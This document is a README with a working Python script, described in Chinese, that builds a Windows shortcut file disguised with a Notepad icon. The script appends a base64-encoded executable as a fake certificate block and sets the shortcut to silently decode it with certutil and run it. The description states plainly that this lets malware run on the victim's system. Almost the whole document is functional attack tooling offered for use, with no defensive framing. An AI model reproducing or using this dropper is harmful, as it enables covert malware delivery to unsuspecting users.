# 隱藏捷徑檔案
## 描述
這個 Python 腳本可以用來建立一個包含嵌入檔案的 Windows 捷徑。這個腳本需要兩個參數：要嵌入的檔案和生成的捷徑名稱。
腳本首先使用 winshell 模組創建一個 Windows 捷徑。這個捷徑被配置為執行一個命令，該命令會解碼嵌入的檔案並執行它。
接著，腳本使用 base64 模組對要嵌入的檔案進行編碼，並將編碼後的數據以證書的形式附加到捷徑檔案中。
最後，腳本會在螢幕上顯示生成的捷徑名稱。當捷徑被點擊時，嵌入的檔案會被提取並執行，從而允許惡意軟體在系統上運行。
## Code
    #!/usr/bin/env python3
    
    # Requirements:
    # -> pip install pypiwin32
    # -> pip install winshell

    import argparse
    import base64
    import os
    import pathlib
    import random
    import string
    
    import winshell
    
    
    def build_shortcut(file_to_embed, shortcut_name):
        output_shortcut = "{}{}.lnk".format(
            os.path.join(pathlib.Path(__file__).parent.resolve(), ''),
            shortcut_name,
        )    
    
        with winshell.shortcut(output_shortcut) as shortcut:    
            # @echo off & (for %i in (.lnk) do certutil -decode %i [filename]) & start [filename].exe
            payload = "@echo off&(for %i in (*.lnk) do certutil -decode %i {0}.exe)&start {0}.exe".format(
                "".join(random.choice(string.ascii_letters) for i in range(8))
            )                
    
            shortcut.description = ""
            shortcut.show_cmd = "min"
            shortcut.working_directory = ""
            shortcut.path = "%COMSPEC%"
    
            shortcut.arguments = "/c \"{}".format(
                payload,
            )
    
            shortcut.icon_location = ("%windir%\\notepad.exe", 0)
    
        with open(file_to_embed, "rb") as file:
            encoded_content = base64.b64encode(file.read())
    
        with open(output_shortcut, "ab") as file:
            file.write(b"-----BEGIN CERTIFICATE-----")
            file.write(encoded_content)
            file.write(b"-----END CERTIFICATE-----")
    
        print("[+] Shortcut generated: \"{}\"".format(output_shortcut))
    
    if __name__ == "__main__":
        parser = argparse.ArgumentParser(description=f"Create Windows Shortcut with Self-Extracting Embedded File.")
    
        parser.add_argument('-f', '--embed-file', type=str, dest="embed_file", required=True, help="File to inject in shortcut.")
    
        parser.add_argument('-n', '--shorcut-name', type=str, dest="shortcut_name", required=True, help="Generated shortcut name.")
    
        try:
            argv = parser.parse_args()      
        except IOError as e:
            parser.error() 
    
        build_shortcut(argv.embed_file, argv.shortcut_name)
    
        print("[+] Done.")
